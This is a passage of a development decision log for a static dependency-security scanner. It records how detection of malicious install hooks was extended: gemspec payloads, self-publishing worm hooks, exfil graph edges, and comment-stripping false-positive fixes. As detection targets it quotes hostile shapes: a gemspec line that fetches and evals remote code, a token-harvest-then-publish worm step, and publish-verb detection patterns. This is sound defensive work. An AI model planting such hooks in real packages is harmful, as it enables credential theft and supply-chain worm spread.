Residual limitations: the gem search covers Bundler's vendor path and an explicit `$GEM_HOME`, not the
default user/system gem directories (`~/.gem/ruby/<version>`, the ruby installation's own gem dir) — those
require guessing ruby-version layouts and are disclosed as unavailable rather than guessed at; a follow-up
could add them behind the same local-only posture. npm's disclosure is per absent PACKAGE; it does not
distinguish "no node_modules at all" from "this one package missing from an otherwise installed tree",
though the count makes the difference visible. The gemspec content-gate (a narrower marker than `scanCaps`
for gemspec shell-outs) is unchanged and remains on the outstanding list.

## D-149 — the cargo build.rs fetch defaults on

**Trigger:** D-141 corrected the premise D-140's opt-in rested on and closed by raising the inconsistency
"so the decision can be revisited on accurate grounds": PyPI fetches per-dependency source by default while
Cargo required `-cargo-fetch-source`. Revisited and decided by the owner, with a stated principle worth
recording verbatim in substance: coverage defaults ON and flags exist for opting out — transparency and no
blind spots — unless the action itself carries a risk, in which case the risk is weighed first.

**The risk was weighed, and there is no new risk class.** The fetch downloads crate archives from crates.io,
checksum-verified against the published record before extraction (D-140), analyzes build.rs statically and
executes nothing (D-04). Every ordinary online scan already sends coordinates to api.osv.dev and fetches
per-dependency sdists from PyPI by default, and the registry-history stage already talks to crates.io. The
exposure — revealing which packages a project uses to registries that served them — is one the default
posture already accepts everywhere else, and `-offline` remains the single switch that stops all of it.

**The change.** `-cargo-fetch-source` (opt-in) is replaced by `-no-cargo-fetch-source` (opt-out), matching
the repo's convention for default-on stages (`-no-osv`, `-no-registry`, `-no-expand`). The enrichment nests
inside the registry stage as before, so `-no-registry` still implies no registry fetches. Under `-offline`
the client serves only its warm cache and a cold miss keeps its `source-unavailable` gap — the same posture
as OSV and the PyPI fetcher, per D-141. The old flag is removed rather than kept as a silent no-op: a script
still passing it fails loudly at flag parsing, which beats accepting a flag that no longer does anything.

**Proven at the CLI seam, hermetically and live.** The flag-level tests run `-offline` so the enrichment
executes against an empty cache with no network: by default `cargo-source` appears in the report's data
sources having queried the unexamined crate; with `-no-cargo-fetch-source` it does not, and the crate stays
disclosed. Mutations reverting the gate to opt-in or ignoring the opt-out each fail their test. Live, with
no flags at all: a cold clone pinning `arrayref@0.3.7` fetched by default, determined the crate ships no
build.rs, and cleared its `source-unavailable` gap — the cold-clone scan that D-139 showed running blind now
examines by default.

**Validation:** `gofmt`, `go build`, `go vet` clean; full suite green (34 packages); `-race` clean on
`cmd/depsnort`.

Residual limitations: default online scans of unvendored cargo trees now fetch once per unexamined crate —
cached across runs, but a visible traffic change for large cold trees; `-no-cargo-fetch-source` or
`-offline` restores the old cost. The fetch resolves the exact locked version only (deliberate, D-140);
nothing here widens what is fetched, only when. The same default-on principle applied to this flag has NOT
been swept across every other opt-in in the tool — `-epss` remains opt-in, defensibly (it is an enrichment
ranking, not coverage, and needs a second external service) — but that sweep is now the recorded yardstick
if the owner wants it.

## D-150 — a gemspec's own body is executed code, and now analyzed as such

**Trigger:** the outstanding list carried "RubyGems gemspec content-gate (needs a narrower marker than
`scanCaps` for gemspec shell-outs)" since D-135. This closes it.

**The gap, reproduced before building anything.** A `.gemspec` is not data — it is Ruby that `gem build` and
`gem install` EVALUATE. `AnalyzeRuby` looked at gemspec content only when the gemspec declared a native
extension (`extensions` and `extconf` both present as substrings), and ran `scanCaps` on it then. So a
payload sitting directly in the gemspec body — `eval(Net::HTTP.get(URI('…')))` with no extension declared —
produced zero hooks, while `scanCaps` on that same text correctly returned `[network exec]`. The signal was
computed and thrown away because the wrong precondition guarded it.

**Why the gate could not simply be "any capability", which is the whole reason this sat open.** A gemspec
near-universally populates `s.files` with `` `git ls-files`.split ``, a backtick shell-out that trips
`CapExec` on essentially every real gem in existence. Running `scanCaps` over every gemspec and firing on a
non-empty result would flag the entire ecosystem — the false-positive tax that gets a detector switched off.
`scanCaps(benign git ls-files gemspec)` is exactly `[exec]`, confirmed in the reproduction.

**The resolution is the split VC-002e/f already draw for other executed hooks: exec is table stakes, a risk
capability is the tell.** A new `gemspec:body` hook fires when a gemspec WITHOUT an extension declaration
exhibits `CapNetwork`, `CapObfuscation`, `CapCradle`, or `CapCredentials` — never on `CapExec` alone.
`gemspecBodyPayload` is that gate, and it is the load-bearing piece: the mutation widening it to
`len(caps) > 0` fails the benign `git ls-files` boundary and the broader exec-only cases, which is the
guarantee that this does not reintroduce the false-positive flood the narrow gate existed to avoid.

**The extensions path is unchanged and kept distinct.** A gemspec that DOES declare a native extension keeps
the D-135 behaviour — any capability, `CapExec` included, because the extconf.rb it points at will run — and
still fires as `gemspec:extensions`, not `gemspec:body`. The two are mutually exclusive: an
extensions-declaring gemspec with a body payload fires the extensions hook only, since the declaration is
the more specific precondition and owns the finding. Tests pin both the correct-name and the no-double-fire
properties, and the mutation collapsing extensions into the body gate fails both.

**Proven end to end.** Through the rubygems adapter, a Gemfile.lock gem shipping a gemspec with
`` `git ls-files` `` plus `eval(Net::HTTP.get(…))` now produces a **VC-002b finding — "install hook
(gemspec:body) reaches the network"** — a detection that yielded nothing at all before this entry. IOCs in
all fixtures are inert (RFC 5737 TEST-NET-3 `203.0.113.x` / `.invalid`).

**Mutation-proven, four sites:** removing the body gate fails the payload tests; widening it to any
capability fails the benign-baseline tests; dropping `CapNetwork` from the risk set fails the fetch-eval
test; routing extensions through the body gate fails the name and double-fire tests.

**Validation:** `gofmt`, `go build`, `go vet` clean; full suite green (34 packages); `-race` clean on
`internal/installsurface` and `internal/ecosystem/rubygems`.

Residual limitations: the gate keys on the capabilities `scanCaps` already recognizes, so a gemspec payload
using a Ruby network/exec idiom `scanCaps` does not yet model is missed here exactly as it would be in an
extconf.rb — this widens WHERE the existing capability scan runs, not what it recognizes. A gemspec that both
declares an extension AND carries an unrelated body payload reports the extension hook only; the body payload
rides along in the same scanned text so its capabilities still surface, but the hook is named for the
extension. Exec-only remains deliberately silent, which is correct for `git ls-files` but would also miss a
gemspec that shells out to a genuinely hostile local command with no network/obfuscation tell — the same
exec-is-ordinary tradeoff every build-script analysis in the tool makes.

## D-151 — the install-surface conformance suite reaches the dependency dispatch

**Trigger:** the outstanding list carried "conformance suite covers root paths only (dependency-scan paths
unexercised)". D-148 had just added new dependency-scan code to three adapters, so the gap was no longer
theoretical.

**What the existing suite actually exercised, which is narrower than it reads.** D-135's
`TestInstallSurfaceAsymmetricPrecondition` proves, for each adapter, that a second independent analysis fires
even when the first analysis's precondition is removed — the D-134 regression, generalized. But it builds
every fixture node with `Depth: 0` and `MarkRoot`, so it tests each adapter's ROOT dispatch. For several
adapters the root dispatch is entirely separate code from the dependency dispatch: npm's node_modules-keyed
main loop is a different pass from the publishable-root path a no-`npm.path` node actually hits (a fact
confirmed by probe — the root conformance case exercises the publishable path, never the main loop);
cargo/nuget/rubygems reach a dependency through vendor- and cache-lookup functions the root never calls. A
precondition bug in that dependency dispatch would pass the root suite untouched — and D-148's
`scanDependencyGem`, npm's per-node loop, and nuget's `scanDependencyPkg` are exactly that dispatch.

**The addition.** A parallel `depCases()` places each fixture where the adapter searches for a DEPENDENCY's
source — `node_modules/<name>`, `vendor/<name>`, the `$NUGET_PACKAGES` cache layout
`<lowercase-name>/<version>/`, `vendor/bundle/ruby/*/gems/<name>-<version>` — marks the node a real
dependency (`Depth: 1`, non-root), removes the first analysis's precondition, and asserts the second still
fires. npm, cargo, nuget and rubygems each qualify (2+ independent analyses on the dependency path); composer
(its `vendor/<name>` read funnels through one `AnalyzePHP` call), pypi (single fetched-sdist analysis) and
gomod (single `AnalyzeGo` call) are recorded as exempt with reasons, and a coverage meta-test fails if a new
extractor appears in neither list — the same guard the root suite's `TestEveryInstallSurfaceExtractorHas
AsymCoverage` gives.

**The anti-vacuity guard is the part that took care.** A dependency-path test that only checked "the wanted
hook appeared" could pass for the wrong reason: a MISPLACED fixture finds nothing (that one fails safe), but
a fixture that accidentally triggers the ROOT dispatch would produce the hook and pass while proving nothing
about the dependency path. So each assertion also checks the hook's `hook.package` attribution equals the
DEPENDENCY node's ID, not the root's. A green result can then only mean the dependency dispatch itself ran
the second analysis. Writing this also corrected a first-cut design flaw: an initial "positive control" test
reused the same first-precondition-absent fixture as the asymmetry test, making the two identical — folded
into the single attribution-checked assertion instead.

**No production bug found — and that is the honest result.** Every adapter's dependency dispatch already
holds the contract; this locks that in. The value is a guard, not a fix: reintroducing the D-134 shape into
each dependency dispatch (gate npm's entry-module pass behind `len(m.Scripts)`, cargo's proc-macro behind
`build.rs`, nuget's MSBuild behind PowerShell hooks, rubygems' gemspec behind extconf) fails the
corresponding case, and dropping an adapter from `depCases()` fails the coverage meta-test — five mutations,
all load-bearing.

**Validation:** `gofmt`, `go build`, `go vet` clean; full suite green (34 packages); `-race` clean on
`internal/ecosystem/conformance`. Test-only change; no production code touched.

Residual limitations: the contract verified is the asymmetric-precondition one (one analysis not gated behind
another), the specific D-134 shape — it is not a general "the dependency dispatch finds every payload the
root dispatch would" equivalence, which would require a far larger fixture matrix. composer's dependency path
is exempted on the grounds that its scripts-vs-plugin split lives inside `AnalyzePHP` and is covered by the
root suite; if composer ever splits those into two adapter-level analyses, the exemption must move to a
`depCases()` entry, which the coverage meta-test does NOT catch (it only catches a wholly-unlisted adapter),
so that remains a reviewer's judgement.

## D-152 — the propagation phase, and the edge that was drawn for four years' worth of nothing

**Trigger:** an external gap analysis proposed twelve YAML rules. Eight were already covered, out of scope
for a static analyzer, or heuristics this project has declined on principle (TLD-geography, narrative keyword
matching). One was a real gap, and confirming it took a single grep: `EdgeRepublish` had no creator.

**The gap, stated exactly.** The Shai-Hulud family has three phases. depSNORT detected the credential phase
(VC-002c/d, OPU-19) and the persistence phase (VC-002g, OPU-19). The phase between them — the install hook
that PUBLISHES, turning one compromised package into many — had no capability, no check, and no evidence
marker. Reproduced before building anything: `npm publish`, `npm version patch`, `libnpmpublish` and `yarn
publish` in a postinstall all scanned as plain `[exec]` or `[network]`, indistinguishable from a hook that
shells out to a compiler. The worm step was invisible.

Worse, and only visible from inside: `graph.EdgeRepublish` has been defined as "worm loop back into the
declared tree", counted in the verdict's install-time subgraph (`verdict.go`), and rendered by both the
Cypher and DOT emitters since the graph vocabulary was written — while **no code path anywhere ever created
one**. The vocabulary described a detection the tool did not perform. (`EdgeExfil` is still in that state;
recorded below, not fixed here.)

**What was added.** `CapPropagate`, set by a package-manager-anchored publish regex (`npm|pnpm|yarn|bun
publish`, plus `npm version <bump>`, which publishes under common release configs) and by the programmatic
paths (`libnpmpublish`, `npm-registry-fetch`, the registry's `/-/package` endpoint). `VC-002k`
(`HookSelfPropagation`), critical and blocking: unlike network egress, an install hook that publishes has no
benign reading. When credential access is present on the same hook the evidence names the complete loop —
harvest a registry token, publish with it — because the operator's next action is rotating tokens, not
merely removing a package. And `EdgeRepublish` is finally emitted, pointing from the hook back at its own
package: that IS the loop.

**Three false-positive boundaries, each one a test.** `npm publish --dry-run` is how careful release tooling
REHEARSES a publish — flagging it would fire on exactly the projects that have published nothing.
`prepublish`/`postpublish`/`prepublishOnly` are hook NAMES in a large share of package.json files; matching
the bare word "publish" flags all of them. And `emitter.publish()`, `redis.publish()`, `mqtt.publish()` are
pub/sub, not registry traffic. A live scan of a project using `prepublishOnly`, `np`, `npm publish
--dry-run` and `postpublish` returns exit 0 with no findings and no edges.

**The defect live validation caught, which the unit tests had masked — twice.** Every unit test passed with
the publish inlined into the hook command. Scanning an actual worm fixture produced the VC-002k finding over
a graph with **no republish edge at all**, and the two disagreements had two separate causes:

1. The edge was gated on the hook's own capabilities, but the real attack puts an unremarkable `node
   ./harvest.js` in the hook command and the publish inside the referenced script. Fixed by testing
   `Hook.HasCap`, which folds in artifacts — matching how VC-002k already reasons, since `collectHooks`
   absorbs artifact caps into the hook view. The graph must agree with the finding.
2. Even fixed, the edge reached only four adapters. **npm, PyPI and Composer each hand-roll a near-verbatim
   copy of `instsurf.AddToGraph` rather than calling it** — so wiring the edge in the shared helper left out
   the one ecosystem Shai-Hulud actually targets. This is the D-15/D-37 shape a third time: a second
   implementation of a rule, drifting from the first.

Both are now regression-tested, and the second got the D-37 treatment rather than a comment: a new
`republish_test.go` conformance suite runs an inert publishing hook through **all seven** adapters and fails
if any stops drawing the edge, with a boundary case (a benign hook draws none), an anti-vacuity precondition
(a fixture producing no hook fails loudly rather than passing as "no edge"), and a coverage meta-test.

**Two vacuous tests my own first pass shipped, found by mutation and fixed.** Every check-layer test called
`HookSelfPropagation{}.Run` directly, so **unregistering the check from `builtin.Default()` broke nothing** —
a check that detects nothing in production would have passed the suite. Now routed through `Default()`, the
single registration point. And `TestD152IsCriticalAndBlocking` asserted only `Meta()`; the declared Meta and
the emitted finding are separate literals, so the emitted severity could be downgraded silently while the
test stayed green. Both literals are now asserted. Separately, the four false-positive tests would all have
passed against a `scanCaps` that returned nothing at all, so the benign baseline now proves the scanner is
still classifying — verified by mutating `scanCaps` to return nil.

**Validation:** `gofmt`, `go build`, `go vet` clean; full suite green (34 packages); `-race` clean on all
seven touched packages. Nineteen mutations run, all killed — including one per graph-builder site, so each
adapter's edge is individually load-bearing. Live CLI validation on an inert fixture (IOCs are RFC 5737
TEST-NET-3 / `.invalid`; nothing executed, per D-04) yields VC-002k critical/block with the worm loop named,
the `republish` edge in JSON, and the edge rendered in DOT.

Residual limitations: the publish verbs are npm-family — a `gem push`, `twine upload`, `cargo publish` or
`dotnet nuget push` from an install hook is NOT yet propagation, though the capability, the check and the
edge are all ecosystem-neutral and only the marker table needs extending. Obfuscated publishes (the command
assembled at runtime from string fragments) are out of reach of a static marker scan, as they are for every
other capability here; `CapObfuscation` still fires on them via VC-002e. `EdgeExfil` remains defined,
gated and rendered while nothing creates it — the same aspirational-vocabulary defect this entry fixed for
`EdgeRepublish`, still open. And a package whose install hook legitimately publishes a DIFFERENT package
(a monorepo release runner invoked at install time) would be flagged; no benign instance of that shape was
found, and the block is deliberate.

## D-153 — a URL in a Rust comment is not a network call

**Trigger:** a routine fluxfang re-baseline after the coverage-disclosure work — not a targeted hunt. Broader
`build.rs` coverage exposed a pre-existing bug rather than introducing one: these files had previously been
`source-unavailable` and never read at all.

**The gap.** `AnalyzeRust` called `scanCaps` on raw, unstripped source. Any URL in a Rust comment therefore
read as `CapNetwork`, identically to a real outbound call. That is not a rare shape: citing a stabilization
blog post or a GitHub issue to explain a version-gated `cfg` check is among the most common idioms in the
ecosystem, and license headers routinely embed `http://opensource.org/licenses/MIT` as boilerplate.

Confirmed on a real scan, not synthetically: 17 new VC-002b findings on one project — `serde`, `anyhow`,
`thiserror`, `proc-macro2`, `quote`, `zerocopy`, `rustix`, `winapi`, and others — moving gate-eligible from 5
to 22. Every evidence string was a documentation citation or a license URL. Zero were network calls. The
pattern was the tell before any source was read: dependency-light utility crates, about as far from "does
networking" as Rust gets, each bundling documentation URLs per finding.

**The fix, and why it is one line.** `stripCodeComments` already existed for exactly this (D-25, the defect
that made esbuild's installer "reach" snapcraft.io and nodejs.org from a comment block). `AnalyzeLoadTime`,
the PHP plugin path, and `AnalyzeAIAgentConfig` (OPU-37) all already called it. So did `AnalyzeProcMacro` —
which makes this an inconsistency inside Rust's own section of the file, not merely with distant functions:
proc-macro source was comment-stripped while `build.rs`, two hundred lines away, was not. `AnalyzeRust` was
the last C-family outlier.

Capability scanning, sink detection and URL-artifact extraction now run on comment-free text. `Command` still
displays the raw source, so a human reading a finding sees real code rather than a stripped rendering.

**The over-correction guard is the part that needed care.** Stripping comments risks destroying real URLs:
`reqwest::blocking::get("https://…")` contains `//` inside a string literal. `lineCommentRe`'s `(^|[^:])`
guard means a `//` preceded by `:` never matches, so the URL scheme survives while `// https://blog…` strips
whole. `TestAnalyzeRustStillDetectsRealNetworkCalls` pins this: a real `reqwest` call one line below an
unrelated comment URL must still yield `CapNetwork` and the real artifact, and must not yield the comment's.
Without it, a fix that stripped too aggressively would silently defeat the OPU-32/39 cradle detection.

**A second effect observed and ruled out, not folded in.** The same re-scan showed 26 VC-004 findings escalate
to gate-eligible carrying "the awakening release also declares an install hook." Traced before assuming
cause: VC-004 reads `hasInstallHook()`, which tests for an `EdgeDeclaresHook` edge, and `instsurf.AddToGraph`
draws that edge unconditionally whenever a hook exists. This change alters which capabilities land on a
hook, never whether the hook is created — so it cannot produce that escalation. Coverage counts were
identical across both scans (281 `source-unavailable`), ruling out "more source became readable". Best-
supported explanation is ordinary fetch variability between two live scans against the cargo-source cache.
Recorded rather than silently omitted, and deliberately not presented as part of this fix.

**Validation:** the three real evidence shapes reproduced structurally (blog+issue citations, license block
comment, single citation), each confirmed to yield zero `CapNetwork` and zero artifacts; the real-call
companion test above; full suite green; the exact fluxfang scan rerun with all 17 false positives gone, six
spot-checked directly; and the adversarial corpus at 8/8 with `cargo-buildrs-exfil` still detecting VC-002d
through the shipped binary — the guard that proves comment-stripping did not blind a real `build.rs` payload.

Residual limitations: this closes the C-family comment class only. Ruby (`extconf.rb`, Rakefile, gemspec),
PowerShell and MSBuild XML still scan raw, and `stripCodeComments` does not handle `#` or `<!-- -->` at all —
so the same false-positive class remains open in those ecosystems, unaddressed rather than fixed here. And
comment stripping is a heuristic, not a tokenizer: a `//` inside a string literal that is not a URL scheme
still truncates, whose only cost is under-citing a reference, never fabricating one.

## D-154 — propagation detection, past npm (OPU-41)

**Trigger:** an external purple-team assessment of depSNORT itself (not a targeted hunt on a scanned
project). D-152 shipped VC-002k npm-only and said so in its own residual-limitations note: the propagation
vocabulary — `CapPropagate`, `graph.EdgeRepublish`, `HookSelfPropagation` — was already ecosystem-neutral,
and "only the marker table needs extending." This closes that gap for the four ecosystems with their own
CLI publish verb.

**The gap.** `propagationRe` recognized `npm|pnpm|yarn|bun publish` and the npm-family `version` bump, and
nothing else. A RubyGems `extconf.rb` running `gem push`, a Cargo `build.rs` running `cargo publish`, a
NuGet install script running `dotnet nuget push`, or a PyPI `setup.py` running `twine upload` all scanned as
plain `[exec]` — indistinguishable from an ordinary build step — despite VC-002k being CRITICAL/block and
having no benign reading. Confirmed before writing any fix: reverting the change and rerunning the new
tests fails all four ecosystems' positive cases, each falling back to `[exec]` alone (D-154/OPU-41 test
run), proving this was a genuine blind spot and not a hypothetical one.

**The fix.** One marker-table extension, exactly as D-152 predicted: `propagationRe` gained `gem\s+push`,
`cargo\s+publish`, `(?:dotnet\s+nuget|nuget)\s+push`, and the PyPI build-tool paths (`twine upload` —
including the `python -m twine upload` form —, `flit publish`, `hatch publish`, `poetry publish`). No
change to `CapPropagate`, `instsurf.AddToGraph`, or `HookSelfPropagation` — confirmed by grep before
starting that none of the three name an ecosystem, so the marker table really was the only load-bearing
piece. Composer and Go are deliberately given no entry: neither ecosystem's registry is reached by a
client-side publish verb an install hook could invoke (Packagist and the Go proxy both replicate from a
pushed git tag), so there is no marker to add, not an oversight.

**Dry-run scope, deliberately narrow.** `cargo publish --dry-run` is a confirmed real flag and is excluded
the same way `npm publish --dry-run` is. `gem push`, `dotnet nuget push`/`nuget push`, and `twine upload`
have no dry-run flag to exclude. `poetry publish` and `flit`/`hatch publish` were NOT given a dry-run
exclusion here: a `poetry publish --dry-run` flag could not be confirmed from documentation in the time this
change took, and guessing at an unverified flag risks the opposite defect from D-153 — an exclusion that
doesn't actually exist would silently blind the detector on a real publish. Left as a disclosed follow-up
rather than shipped on a guess.

**Validation:** `gofmt`, `go build`, `go vet` clean; full suite green (34 packages, cached where unaffected);
`-race` clean on `installsurface`, `check/builtin`, and all four newly-covered ecosystem adapters. New tests
added at both layers — capability (`internal/installsurface/d154_test.go`) and end-to-end through the
shipping check pack via `Default()` (`internal/check/builtin/d154_test.go`, RubyGems and Cargo) — each
proven non-vacuous by reverting the fix and confirming the new positive assertions fail (D-154/OPU-41 test
run: all four ecosystem positives and both end-to-end tests fail cleanly against the pre-patch regex, with
the negative/boundary tests unaffected). Live CLI validation on an inert fixture (no gem is built, no
publish reaches a registry, nothing here is ever executed by depSNORT's static analysis or by this test
per D-04): a RubyGems `extconf.rb` running `gem build` then `gem push` yields VC-002k critical/block, exit
code 1, the `republish` edge in both the JSON graph and the DOT emitter, matching the shape of D-152's own
live validation.

Residual limitations: `poetry publish`/`flit publish`/`hatch publish` dry-run flags remain unverified and
unexcluded — a real dry-run invocation via one of these three would currently be reported as propagation.
Composer's install-time surface (Packagist git-tag-based publish flow) was not re-examined for a client-side
equivalent beyond the reasoning above. And this is the same static ceiling every other install-surface check
carries (D-04/OPU-32 lineage): a publish command assembled at runtime from string fragments is out of reach
of a literal marker match, exactly as it is for the npm-family verbs D-152 already accepted this limitation
for.

## D-156 — the `--dry-run` carve-out is per command, not per hook

**Trigger:** a follow-up to D-154, not a fresh hunt. The verification pass on the cross-ecosystem
propagation work surfaced a false-negative class inherited from D-152's npm logic and carried forward when
D-154 widened the carve-out to cargo — a defect in the most severe finding class the tool has, VC-002k
critical/block.

**The gap.** `propagationDryRunRe` was matched against the whole hook blob. A single `--dry-run` anywhere in
a hook therefore suppressed `CapPropagate` for a genuine publish sitting elsewhere in the same script.
`npm publish --dry-run && npm publish` — a rehearsal chained to the real thing — scanned as no propagation,
as did a decoy `cargo publish --dry-run` placed next to a real one. This is exactly the shape an author
evading detection would reach for: park a harmless dry-run beside the live publish and the whole hook reads
clean. A worm-step false negative on the single most severe signal class.

**The fix.** `scanCaps` now splits the blob at shell command separators (`splitCommandSegments`: `;`, `&`,
`|`, and newlines) and applies the dry-run carve-out per segment rather than over the whole text. A rehearsal
standing beside a real publish counts as propagation; a lone rehearsal, the case the carve-out exists to
protect, still does not.

**Validation:** `internal/installsurface/dryrun_masking_test.go` —
`TestDryRunFollowedByRealPublishStillPropagates` exercises a real publish beside a rehearsal in four shapes,
and `TestLoneDryRunIsStillNotPropagation` pins the boundary the fix must not regress. Proven non-vacuous:
reverting the change fails the former (the caps fall back to `[]`/`[exec]`) while the latter stays green, so
the fix neither under- nor over-corrects. Full suite green, `-race` clean.

Residual limitations: the segment split is a heuristic, not a shell parser. A publish assembled across a
pipe-continuation or a here-doc is out of its reach — the same static ceiling every marker in this file
carries (D-04/OPU-32 lineage), and the same one D-152 already accepted for the npm-family verbs.

## D-157 — draw `graph.EdgeExfil` for VC-002d exfil-capable hooks

**Trigger:** the verification pass's finding #4 — the same aspirational-vocabulary defect D-152 closed for
`EdgeRepublish`, still open one edge over for `EdgeExfil`.

**The gap.** `EdgeExfil` ("artifact/sink → C2") was defined, counted in the install-time subgraph, and
rendered by both the Cypher and DOT emitters — but no detector ever produced one. The exfil leak was legible
in the VC-002d finding text and invisible in the graph, precisely the "an edge drawn for nothing" condition
D-152 named.

**The fix.** In `instsurf.AddToGraph` — and the three hand-rolled npm, PyPI, and Composer copies that predate
the helper — a hook carrying both `CapCredentials` and `CapNetwork` now draws an edge from each credential
sink to each remote artifact. Both endpoints already sit in the install-time subgraph, so nothing new
propagates risk and no exit code moves; this is a graph-draw over a check (VC-002d) that already fires, not
new detection logic.

**Validation:** `internal/ecosystem/conformance/exfil_test.go` — `TestExfilEdgeIsDrawnByEveryAdapter` asserts
the edge across all seven ecosystem adapters, and `TestExfilNoEdgeWithoutBothCaps` pins the boundary that no
edge is drawn unless both capabilities are present. Mutation-checked across every adapter (reverting the
wiring fails the draw test, the boundary stays green) and live-fired through the built binary, where
`sink → exfil → artifact` renders in DOT as intended.

Residual limitations: an edge needs a materialized sink and a remote artifact to connect. The rubygems
`gemspec:extensions` branch is caps-only (D-150) and materializes neither, so its exfil case is carried in
the test via a gemspec-body payload rather than that branch.

## D-158 — strip comments before scanning Ruby, PowerShell, and MSBuild

**Trigger:** the verification pass's finding #3, which is really D-153's own residual-limitations note come
due: D-153 closed the comment false-positive class for the C family and explicitly flagged Ruby, NuGet
PowerShell, and MSBuild XML as still scanning raw source.

**The gap.** `AnalyzeRuby`, `AnalyzeDotNet`, and `AnalyzeMSBuild` scanned unstripped source, so a license
header or a documentation URL in an `extconf.rb`/`Rakefile`/`gemspec`, an `install.ps1`/`init.ps1`, or a
`.targets`/`.props` file read as `CapNetwork` — the identical false-positive class D-153 closed for Rust,
left open in three more ecosystems.

**The fix.** `stripRubyComments` (`=begin`/`=end` blocks plus `#`), `stripPowerShellComments` (`<# #>` blocks
plus `#`), and `stripXMLComments` (`<!-- -->`), wired into the three analyzers the same way `AnalyzeRust`
uses `stripCodeComments`: capability scanning, sink detection, and URL-artifact extraction run on
comment-free text, while the raw source is retained for `Command` display. The `#` strip is anchored on
preceding whitespace or line-start and excludes the Ruby interpolation openers `#{`, `#$`, and `#@` — RE2 has
no lookahead, so this is done by construction — so a marker glued to interpolated code is not swallowed as a
comment.

**Validation:** `internal/installsurface/comment_stripping_test.go` exercises both directions of D-153's
over-correction guard for all three grammars (a commented marker must not fire; a real network call must
still be detected), plus `TestRubyInterpolationNotEatenAsComment` for the interpolation edge. Mutation-
checked: reverting the change fails the commented-marker cases, and the real-network cases pass either way,
proving the tests pin behavior and the strip does not swallow real capability.

Residual limitations: the same heuristic discipline as D-25 and D-153 — over-stripping can only under-cite a
reference, never fabricate a capability, and this is comment removal, not tokenization.

## D-159 — test the untrusted-input parsers: registry, graph, securefs

**Trigger:** the verification pass's finding #2 — coverage inverted relative to the trust boundary. The
detection logic sat near 90% while the code parsing hostile registry JSON and untrusted filesystem paths sat
far lower, i.e. the surface most exposed to adversarial input was the least tested.

**The gap — a test gap, not a bug.** `securefs` ReadDir/Contains (the directory-facing containment surface),
`graph` traversal edge cases, and the `registry` dependency parsers all had thin or no direct coverage. No
defect was latent behind it; the concern was that the untrusted-input surface had the least protection
against regression.

**The fix.** Adversarial and edge-case suites, each targeting the parser rather than padding line count.
`internal/securefs/readdir_contains_test.go` drives real escape vectors — path traversal, absolute-outside
paths, a symlinked-out directory (the entry-name-leak threat the doc comments name, with a graceful skip
where the OS lacks symlink support), regular-file refusal, and the prefix-sibling boundary — taking securefs
from ~55% to 88%. `internal/graph/edgecases_test.go` covers RenameNode, Merge, self-loop, cycle termination,
a dangling edge, and the empty graph, taking graph from ~60% to 77%. `internal/datasource/registry/
deps_parsers_test.go` adds malformed-JSON, empty-field, and platform-filter cases against the gem/composer/
nuget dependency parsers plus a Doer-driven Histories orchestrator test, taking registry from ~42% to 60%.

Folded in here is the race fix that the new registry suite exposed (`38143bf`): the `Histories` test doer's
call counter was written from concurrent fetch goroutines without synchronization, and `-race` flagged it in
CI (cgo/`-race` is unavailable on the Windows dev box, so it surfaced only there). Mutex-guarded now, read
through `callCount()`. Test-only.

**Validation:** the new suites are themselves the validation — all green, and `go test -race ./...` clean
across the entire repo including the newly guarded doer.

Residual limitations: `registry` at 60.3% remains the lowest in the tree; the gap that remains is the
HTTP-orchestration paths rather than the parsers, and closing it further is a reasonable next increment, not
a blocker.

## D-160 — text shown to a human is not egress: display-sink strings in setup.py

**Trigger:** the 2026-08-28 live end-to-end assessment (five repos, four ecosystems). VC-002b flagged
`CapNetwork` on `pillow@12.2.0` and `psutil@7.2.2` setup.py hooks; sdist ground truth showed both were
display text — pillow's basis was a `url-literal` from `https://pillow.readthedocs.io/...` in build_ext
error/help messages, psutil's a `pkg-install:python2 -m pip install` from the Python-2 farewell inside
`sys.exit(textwrap.dedent("""..."""))`. Both reproduced exactly on the shipped analyzer before this fix.

**The gap was two distinct mechanisms, not one.** For psutil, the whole-file inert suppression D-25-era
work added ("drop CapNetwork when its only basis is a shell-tool word with no library call and no exec
sink") could never fire: psutil legitimately runs `subprocess` for its C build, so the file HAS an exec
sink, and the per-file gate was disarmed by real build machinery two hundred lines from the inert string.
The judgment has to be made at the call site, not over the file. For pillow, the cmdclass class body was
scanned RAW — none of the module-level pipeline (docstring/comment strip, display strip, URL strip,
shell-tool suppression) applied — so a documentation URL in an error message read as network in a
`build_ext` override while the identical string at module level would have been stripped.

**The fix.** `stripPyDisplayStrings` drops the CONTENTS of plain string literals inside a display-sink
call's argument list — `print(`, `sys.exit(`, `sys.stderr.write(`, `sys.stdout.write(`, `warnings.warn(` —
and nothing else. It is wired into the module-level cleaning pipeline after `stripPyInert`, and the
cmdclass body now runs the same full pipeline as module-level code (inert strip, display strip, URL strip,
and the shell-tool suppression), with IMDS still recognized on the raw body exactly as before. Two
deliberate asymmetries keep the guard one-sided: f-strings are kept verbatim, because an f-string can
embed executable expressions and displaying a value is not proof the expression that computed it was
inert; and only string contents are dropped, so code nested in the same argument list
(`sys.exit(requests.get(url).text)`) still scans. Over-suppression can only hide text a human was meant to
read; it can never hide a call. An opener is trusted only in its exact builtin/stdlib spelling with no
preceding identifier character or dot — `pprint(` and `obj.print(` are not display sinks.

**A third instance surfaced during validation, and corrected the assessment.** The live report classified
`blis` as a VC-002b true positive ("real pip install invocations in setup.py"). Ground truth disagrees:
blis's `pkg-install` marker came from "please upgrade pip with `pip install --upgrade pip`" inside a
`print(...)` warning, and its setup.py fetches nothing — it compiles bundled C sources. Post-fix blis
correctly reads `[env exec]`, its real build capabilities intact. The FP class had three confirmed members,
one of them previously miscounted as signal.

**Validation:** `d160_display_context_test.go`, two-sided in the D-153/D-158 tradition. Inert direction:
the psutil shape (which asserts the fixture retains a REAL exec sink, so the test cannot pass via the old
whole-file guard), the pillow cmdclass shape, and a printed wget in a cmdclass body. Real direction: a
pip install run through `subprocess.check_call(..., shell=True)`, display chatter beside a real
`os.system` install, `urlopen` inside an f-string inside `print(...)`, `requests.get` as a `sys.exit`
argument, and a real `urlopen` in a cmdclass body beside documentation URLs. Mutation-checked: reverting
the fix fails all three inert-direction tests while every real-direction test passes either way. Live-fired
against the actual sdists: pillow build_ext `[env exec network]` → `[env exec]`, psutil module-level
`[env exec filesystem network]` → `[env exec filesystem]`, blis `[env exec network]` → `[env exec]` — in
each case only the network cap and its display-text evidence moved. Full suite green (34 packages),
`go test -race ./...` clean, gofmt/vet silent.

Residual limitations: openers are matched by literal spelling — `print (` with a space, an aliased
